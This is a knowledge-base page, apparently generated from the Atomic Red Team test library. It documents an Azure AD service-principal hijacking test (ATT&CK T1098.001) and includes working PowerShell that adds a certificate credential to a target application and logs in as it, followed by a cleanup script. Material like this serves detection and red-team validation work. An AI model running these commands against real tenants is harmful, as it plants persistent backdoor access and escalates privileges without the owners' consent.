---
atomic_guid: "b8e747c3-bdf7-4d71-bce2-f1df2a057406"
title: "Azure AD Application Hijacking - Service Principal"
framework: "atomic"
generated: "true"
attack_technique_id: "T1098.001"
attack_technique_name: "Account Manipulation: Additional Cloud Credentials"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.001/T1098.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "b8e747c3-bdf7-4d71-bce2-f1df2a057406"
  - "Azure AD Application Hijacking - Service Principal"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Azure AD Application Hijacking - Service Principal

Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.
This can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.
An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.

## Metadata

- Atomic GUID: b8e747c3-bdf7-4d71-bce2-f1df2a057406
- Technique: T1098.001: Account Manipulation: Additional Cloud Credentials
- Platforms: azure-ad
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1098.001/T1098.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1098-account_manipulation|T1098.001]]

## Input Arguments

### password

- description: Azure AD password
- type: string
- default: p4sswd

### service_principal_name

- description: Name of the targeted service principal
- type: string
- default: SuperSP

### username

- description: Azure AD username
- type: string
- default: jonh@contoso.com

## Dependencies

AzureAD module must be installed.

### Prerequisite Check

```powershell
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name AzureAD -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential > $null

$sp = Get-AzureADServicePrincipal -SearchString "#{service_principal_name}" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host "Generated certificate ""$($cert.Thumbprint)"""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
Write-Host "End of Hijacking"
```

### Cleanup

```powershell
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

$sp = Get-AzureADServicePrincipal -SearchString "#{service_principal_name}" | Select-Object -First 1
$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId
foreach ($cred in $credz) {
  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq "AtomicTest") {
    Write-Host "Removed $($cred.KeyId) key from SP"
    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId
  }  
}
Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq "AtomicCert" } | Remove-Item
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.001/T1098.001.yaml)
